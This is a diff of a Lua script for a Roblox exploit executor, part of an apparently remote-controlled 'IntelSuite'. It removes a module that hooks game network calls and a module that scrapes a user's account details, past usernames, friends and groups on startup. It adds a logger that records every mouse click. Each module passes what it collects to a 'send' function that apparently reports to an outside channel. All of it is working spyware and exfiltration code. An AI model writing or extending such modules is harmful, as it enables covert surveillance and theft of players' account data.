@@ -674,134 +674,49 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- MODULE 10: Remote Spy Logger
--- Activate via !cmd remotespy
+-- MODULE 11: Mouse Logger
+-- Activate via !cmd mouselog
 -- ============================================================
-local function startRemoteSpy()
-    if getgenv().IntelSuite.RemoteSpyActive then
-        send("REMOTE SPY", "Already active.", 16776960)
+local function startMouseLogger()
+    if getgenv().IntelSuite.MouseLogActive then
+        send("MOUSE LOG", "Already active.", 16776960)
         return
     end
-    getgenv().IntelSuite.RemoteSpyActive = true
+    getgenv().IntelSuite.MouseLogActive = true
 
-    local oldNamecall
-    oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
-        local method = getnamecallmethod()
-        if method == "FireServer" or method == "InvokeServer" then
-            pcall(function()
-                if not getgenv().IntelSuite.IsActive then return end
-                local args = {...}
-                local argStrs = {}
-                for i, v in ipairs(args) do
-                    local s = ""
-                    pcall(function()
-                        if type(v) == "table" then
-                            s = HttpService:JSONEncode(v)
-                        else
-                            s = tostring(v)
-                        end
-                    end)
-                    table.insert(argStrs, "[" .. i .. "] " .. s:sub(1, 100))
-                    if #argStrs >= 5 then break end
-                end
-                send("REMOTE SPY",
-                    "**Remote:** " .. tostring(self.Name) ..
-                    "\n**Path:** " .. tostring(self:GetFullName()) ..
-                    "\n**Method:** " .. method ..
-                    "\n**Args:**\n```" .. table.concat(argStrs, "\n"):sub(1, 800) .. "```",
-                    16711935
-                )
-            end)
-        end
-        return oldNamecall(self, ...)
+    local mouse = LocalPlayer:GetMouse()
+
+    mouse.Button1Down:Connect(function()
+        if not getgenv().IntelSuite.IsActive then return end
+        pcall(function()
+            local target = mouse.Target and tostring(mouse.Target:GetFullName()) or "nil"
+            send("MOUSE CLICK",
+                "**User:** " .. LocalPlayer.Name ..
+                "\n**Button:** Left Click" ..
+                "\n**Position:** " .. tostring(mouse.X) .. ", " .. tostring(mouse.Y) ..
+                "\n**Target:** " .. target,
+                8388736
+            )
+        end)
     end)
 
-    send("REMOTE SPY", "Now hooking all FireServer + InvokeServer.\n**User:** " .. LocalPlayer.Name, 65280)
-end
-
-getgenv().IntelSuite.RemoteSpyActive = false
-getgenv().IntelSuite.StartRemoteSpy = startRemoteSpy
-
-
-
--- ============================================================
--- MODULE 7: Roblox API Scraper
--- ============================================================
-local function runAPIScraper()
-    if not getgenv().IntelSuite.IsActive then return end
-    task.spawn(function()
-        local uid = tostring(LocalPlayer.UserId)
-        local result = "**User:** " .. LocalPlayer.Name .. "\n**ID:** " .. uid
-
-        -- Premium
+    mouse.Button2Down:Connect(function()
+        if not getgenv().IntelSuite.IsActive then return end
         pcall(function()
-            local premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
-            result = result .. "\n**Premium:** " .. tostring(premium)
+            local target = mouse.Target and tostring(mouse.Target:GetFullName()) or "nil"
+            send("MOUSE CLICK",
+                "**User:** " .. LocalPlayer.Name ..
+                "\n**Button:** Right Click" ..
+                "\n**Position:** " .. tostring(mouse.X) .. ", " .. tostring(mouse.Y) ..
+                "\n**Target:** " .. target,
+                8388736
+            )
         end)
-
-        -- Account created date
-        pcall(function()
-            local r = GET("https://users.roblox.com/v1/users/" .. uid)
-            if r then
-                local d = HttpService:JSONDecode(r)
-                if d then result = result .. "\n**Created:** " .. tostring(d.created or "?") end
-            end
-        end)
-
-        -- Past usernames
-        pcall(function()
-            local r = GET("https://users.roblox.com/v1/users/" .. uid .. "/username-history?limit=5")
-            if r then
-                local d = HttpService:JSONDecode(r)
-                if d and d.data then
-                    local names = {}
-                    for _, v in ipairs(d.data) do table.insert(names, v.name) end
-                    result = result .. "\n**Past Names:** " .. (#names > 0 and table.concat(names, ", ") or "None")
-                end
-            end
-        end)
-
-        -- Friends count
-        pcall(function()
-            local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
-            if r then
-                local d = HttpService:JSONDecode(r)
-                if d then result = result .. "\n**Friends:** " .. tostring(d.count or 0) end
-            end
-        end)
-
-        -- Followers count
-        pcall(function()
-            local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
-            if r then
-                local d = HttpService:JSONDecode(r)
-                if d then result = result .. "\n**Followers:** " .. tostring(d.count or 0) end
-            end
-        end)
-
-        -- Groups
-        pcall(function()
-            local r = GET("https://groups.roblox.com/v2/users/" .. uid .. "/groups/roles")
-            if r then
-                local d = HttpService:JSONDecode(r)
-                if d and d.data then
-                    local groups = {}
-                    for _, v in ipairs(d.data) do
-                        if v.group and v.role then
-                            table.insert(groups, v.group.name .. " [" .. v.role.name .. "]")
-                        end
-                        if #groups >= 5 then break end
-                    end
-                    result = result .. "\n**Groups:**\n" .. (#groups > 0 and table.concat(groups, "\n") or "None")
-                end
-            end
-        end)
-
-        send("ROBLOX API SCRAPE", result:sub(1, 1900), 16711935)
     end)
+
+    send("MOUSE LOG", "Now logging all mouse clicks.\n**User:** " .. LocalPlayer.Name, 65280)
 end
 
--- Run on startup
-task.wait(3)
-runAPIScraper()
-getgenv().IntelSuite.APIScraper = runAPIScraper
+getgenv().IntelSuite.MouseLogActive = false
+getgenv().IntelSuite.StartMouseLogger = startMouseLogger
+
